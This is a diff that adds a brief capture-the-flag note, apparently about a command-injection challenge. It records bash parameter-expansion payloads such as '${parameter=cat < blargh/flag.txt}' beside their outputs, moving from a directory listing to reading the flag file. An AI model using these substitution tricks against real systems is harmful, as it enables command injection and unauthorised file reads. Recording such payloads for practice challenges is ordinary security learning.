@@ -1,0 +1,7 @@
+${parameter?ls}	--> parameter: ls
+${:ls}	--> Bad substitution
+${parameter=ls}	--> blargh
+${parameter=cat blargh} -->	cat: blargh: Is a directory
+${parameter=cd blargh} -->	${parameter=cd blargh}
+${parameter=ls blargh} -->	flag.txt
+${parameter=cat < blargh/flag.txt}  -->	This gave the flag
